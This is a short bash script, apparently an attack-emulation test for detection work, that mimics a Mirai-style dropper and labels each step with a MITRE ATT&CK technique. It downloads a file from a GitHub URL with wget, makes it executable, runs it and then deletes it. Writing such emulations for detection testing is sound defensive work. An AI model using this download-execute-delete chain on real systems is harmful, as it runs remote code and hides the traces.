#! /bin/bash

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /

#   Tactic: Discovery
#   Technique: T1082 - System Information discovery
MIRAI_EXT=`uname -m`
wget https://github.com/greycel/Linux-Attack-Detections/blob/main/Atomic_Chains/hello/atomic-hello?raw=true -O mirai.$MIRAI_EXT

#   Tactic: Defense Evasion
#   Technique: T1222 - File Permissions Modification
chmod +x mirai.$MIRAI_EXT
./mirai.$MIRAI_EXT

#   Tactic: Defense Evasion
#   Technique: T1107 - File Deletion
rm -rf mirai.$MIRAI_EXT
